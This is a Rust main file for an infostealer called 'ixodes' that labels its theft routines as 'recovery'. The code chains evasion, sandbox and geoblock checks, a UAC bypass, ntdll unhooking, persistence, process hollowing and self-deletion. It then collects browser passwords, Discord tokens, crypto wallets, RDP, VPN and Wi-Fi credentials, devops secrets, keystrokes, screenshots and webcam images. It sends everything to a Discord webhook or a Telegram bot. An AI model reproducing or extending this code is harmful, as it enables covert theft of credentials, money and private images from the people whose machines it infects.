mod build_config;
mod recovery;
mod sender;

#[macro_use]
extern crate litcrypt;

use_litcrypt!();

use recovery::task::{RecoveryError, RecoveryOutcome};
use recovery::{RecoveryContext, RecoveryManager};
use tracing_subscriber::prelude::*;
use tracing_subscriber::{EnvFilter, fmt};

#[tokio::main(flavor = "current_thread")]
async fn main() -> Result<(), RecoveryError> {
    let control = recovery::settings::RecoveryControl::global();

    if control.debug_enabled() {
        unsafe {
            use windows_sys::Win32::System::Console::{
                ATTACH_PARENT_PROCESS, AllocConsole, AttachConsole,
            };
            if AttachConsole(ATTACH_PARENT_PROCESS) == 0 {
                AllocConsole();
            }
        }
    }

    let filter = EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info"));
    let fmt_layer = fmt::layer().with_target(false);

    let mut file_layer = None;
    if control.debug_enabled() {
        if let Some(user_dirs) = directories::UserDirs::new() {
            if let Some(desktop_dir) = user_dirs.desktop_dir() {
                let log_path = desktop_dir.join("ixodes_debug.txt");
                if let Ok(file) = std::fs::File::create(log_path) {
                    file_layer = Some(
                        fmt::layer()
                            .with_writer(std::sync::Arc::new(file))
                            .with_ansi(false)
                            .with_target(false),
                    );
                }
            }
        }
    }

    let registry = tracing_subscriber::registry().with(filter).with(fmt_layer);

    if let Some(layer) = file_layer {
        registry.with(layer).init();
    } else {
        registry.init();
    }

    if control.debug_enabled() {
        tracing::info!("debug mode enabled");
    }

    #[cfg(feature = "evasion")]
    recovery::evasion::apply_evasion_techniques();

    if !control.debug_enabled()
        && (recovery::killswitch::check_killswitch().await
            || !recovery::behavioral::check_behavioral().await
            || !recovery::geoblock::check_geoblock().await)
    {
        std::process::exit(0);
    }

    #[cfg(feature = "uac")]
    recovery::uac::attempt_uac_bypass().await;

    let syscall_manager = recovery::helpers::syscalls::SyscallManager::new().ok();
    let _ = recovery::helpers::unhooking::unhook_ntdll(syscall_manager.as_ref());

    let context = RecoveryContext::discover()
        .map_err(|err| RecoveryError::Custom(format!("context initialization failed: {err}")))?;

    let args: Vec<String> = std::env::args().collect();
    if !args.contains(&"--hollowed".to_string()) {
        #[cfg(feature = "persistence")]
        let _ = recovery::persistence::install_persistence(&context.exe_path);
    }

    if recovery::hollowing::perform_hollowing().await {
        #[cfg(feature = "melt")]
        recovery::self_delete::perform_melt();

        if !control.debug_enabled() {
            std::process::exit(0);
        }
    }

    #[cfg(feature = "clipper")]
    recovery::clipper::run_clipper().await;
    recovery::loader::run_loader().await;

    let mut manager = RecoveryManager::new(context.clone());
    register_all_tasks(&mut manager, &context).await?;

    let outcomes = manager.run_all().await?;

    tracing::info!("recovery session complete: {} tasks", outcomes.len());

    if let Err(err) = send_outcomes(&outcomes, &context).await {
        tracing::error!(error = %err, "failed to send recovery artifacts");
    }

    if control.debug_enabled() {
        println!("\nDebug session complete. Press Enter to exit...");
        let mut line = String::new();
        let _ = std::io::stdin().read_line(&mut line);
    }

    Ok(())
}

async fn register_all_tasks(
    manager: &mut RecoveryManager,
    context: &RecoveryContext,
) -> Result<(), RecoveryError> {
    #[cfg(feature = "browser")]
    register_browser_tasks(manager, context).await;

    #[cfg(feature = "communication")]
    register_communication_tasks(manager, context).await;

    #[cfg(feature = "gaming")]
    register_gaming_tasks(manager, context).await;

    #[cfg(feature = "wallet")]
    register_wallet_tasks(manager, context).await;

    #[cfg(feature = "system")]
    register_system_tasks(manager, context).await;

    #[cfg(feature = "network")]
    register_network_tasks(manager, context).await;

    register_multimedia_tasks(manager, context).await;
    register_other_tasks(manager, context).await;

    #[cfg(feature = "devops")]
    register_devops_tasks(manager, context).await;

    Ok(())
}

#[cfg(feature = "browser")]
async fn register_browser_tasks(manager: &mut RecoveryManager, context: &RecoveryContext) {
    use recovery::{browsers, chromium, gecko, gecko_passwords};
    manager.register_tasks(browsers::default_browser_tasks(context).await);
    manager.register_tasks(gecko::gecko_tasks(context));
    manager.register_tasks(gecko_passwords::gecko_password_tasks(context));
    manager.register_tasks(chromium::chromium_secrets_tasks(context));
}

#[cfg(feature = "communication")]
async fn register_communication_tasks(manager: &mut RecoveryManager, context: &RecoveryContext) {
    use recovery::{discord, email, messenger, services};
    manager.register_tasks(messenger::messenger_tasks(context));
    manager.register_tasks(discord::discord_token_task(context));
    manager.register_task(discord::discord_profile_task(context));
    manager.register_task(discord::discord_service_task(context));
    
    #[cfg(feature = "network")]
    manager.register_tasks(services::email_tasks(context));
    
    manager.register_task(email::outlook_registry_task());
}

#[cfg(feature = "gaming")]
async fn register_gaming_tasks(manager: &mut RecoveryManager, context: &RecoveryContext) {
    use recovery::gaming;
    manager.register_tasks(gaming::gaming_service_tasks(context));
    manager.register_tasks(gaming::gaming_extra_tasks(context));
}

#[cfg(feature = "wallet")]
async fn register_wallet_tasks(manager: &mut RecoveryManager, context: &RecoveryContext) {
    use recovery::wallet;
    manager.register_tasks(wallet::wallet_tasks(context));
}

#[cfg(feature = "system")]
async fn register_system_tasks(manager: &mut RecoveryManager, context: &RecoveryContext) {
    use recovery::{account_validation, hardware, system};
    manager.register_tasks(system::system_tasks(context));
    manager.register_tasks(hardware::hardware_tasks(context));
    manager.register_task(account_validation::account_validation_task(context));
}

#[cfg(feature = "network")]
async fn register_network_tasks(manager: &mut RecoveryManager, context: &RecoveryContext) {
    use recovery::{ftp, proxy, rdp, vnc, vpn, wifi};
    manager.register_tasks(rdp::rdp_tasks(context));
    manager.register_tasks(vnc::vnc_tasks(context));
    manager.register_tasks(vpn::vpn_tasks(context));
    manager.register_tasks(ftp::ftp_tasks(context));
    manager.register_task(wifi::wifi_task(context));
    manager.register_task(std::sync::Arc::new(proxy::ReverseProxyTask));
}

async fn register_multimedia_tasks(manager: &mut RecoveryManager, context: &RecoveryContext) {
    let control = recovery::settings::RecoveryControl::global();

    #[cfg(feature = "screenshot")]
    if control.capture_screenshots() {
        manager.register_task(recovery::screenshot::screenshot_task(context));
    }

    #[cfg(feature = "webcam")]
    if control.capture_webcams() {
        manager.register_task(recovery::webcam::webcam_task(context));
    }

    #[cfg(feature = "clipboard")]
    if control.capture_clipboard() {
        manager.register_task(recovery::clipboard::clipboard_task(context));
    }

    manager.register_task(std::sync::Arc::new(recovery::surveillance::keylogger::KeyloggerTask));
}

async fn register_other_tasks(manager: &mut RecoveryManager, context: &RecoveryContext) {
    use recovery::behavioral;
    manager.register_tasks(behavioral::behavioral_tasks(context));
    
    use recovery::other;
    manager.register_tasks(other::other_tasks(context));

    use recovery::file_recovery;
    manager.register_task(file_recovery::file_recovery_task(context));
}

#[cfg(feature = "devops")]
async fn register_devops_tasks(manager: &mut RecoveryManager, context: &RecoveryContext) {
    use recovery::devops;
    manager.register_tasks(devops::devops_tasks(context));
    manager.register_tasks(devops::devops_extra_tasks(context));
}

async fn send_outcomes(
    outcomes: &[RecoveryOutcome],
    context: &RecoveryContext,
) -> Result<(), Box<dyn std::error::Error>> {
    use recovery::settings::RecoveryControl;
    use sender::{ChatId, DiscordSender, Sender, TelegramSender};

    let control = RecoveryControl::global();

    let sender = if let Some(webhook) = control.discord_webhook() {
        Sender::Discord(DiscordSender::new(webhook.to_string()))
    } else if let Some(token) = control.telegram_token() {
        let chat_id = control
            .telegram_chat_id()
            .map(|id| ChatId::from(id.as_str()))
            .unwrap_or_else(|| ChatId::from(0));
        Sender::Telegram(TelegramSender::new(token.to_string()), chat_id)
    } else {
        tracing::warn!("no sender configuration found (IXODES_DISCORD_WEBHOOK or IXODES_TELEGRAM_TOKEN)");
        return Ok(());
    };

    // 1. Send Priority Screenshots
    let mut priority_batch = Vec::new();
    for outcome in outcomes {
        for artifact in &outcome.artifacts {
            let name = artifact.path.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if (name.starts_with("monitor-") || name.starts_with("webcam-")) && name.ends_with(".png") {
                let display_name = name.replace("monitor-", "Display_").replace("webcam-", "Webcam_");
                priority_batch.push((display_name, artifact.path.clone(), artifact.modified));
            }
        }
    }

    if !priority_batch.is_empty() {
        let _ = sender.send_files(&priority_batch, Some("Screenshots")).await;
    }

    // 2. Send Categorized Recovery Artifacts
    let mut categorized: Vec<(String, &recovery::task::RecoveryArtifact)> = outcomes
        .iter()
        .flat_map(|o| o.artifacts.iter().map(move |a| (o.category.to_string(), a)))
        .collect();

    categorized.sort_by(|a, b| a.0.cmp(&b.0).then_with(|| a.1.path.cmp(&b.1.path)));

    const BATCH_SIZE_LIMIT: usize = 100 * 1024 * 1024;
    const MAX_ARTIFACT_SIZE: u64 = 50 * 1024 * 1024;

    let mut current_batch = Vec::new();
    let mut current_batch_size = 0;

    for (_, artifact) in categorized {
        if artifact.size_bytes > MAX_ARTIFACT_SIZE {
            continue;
        }

        let size = artifact.size_bytes as usize;
        if current_batch_size + size > BATCH_SIZE_LIMIT && !current_batch.is_empty() {
            let _ = sender.send_files(&current_batch, Some("Recovery")).await;
            current_batch.clear();
            current_batch_size = 0;
        }

        let rel_path = artifact.path.strip_prefix(&context.output_dir)
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_else(|_| artifact.path.file_name().and_then(|n| n.to_str()).unwrap_or("unknown").to_string());

        current_batch_size += size;
        current_batch.push((rel_path, artifact.path.clone(), artifact.modified));
    }

    if !current_batch.is_empty() {
        let _ = sender.send_files(&current_batch, Some("Full_Recovery")).await;
    }

    Ok(())
}

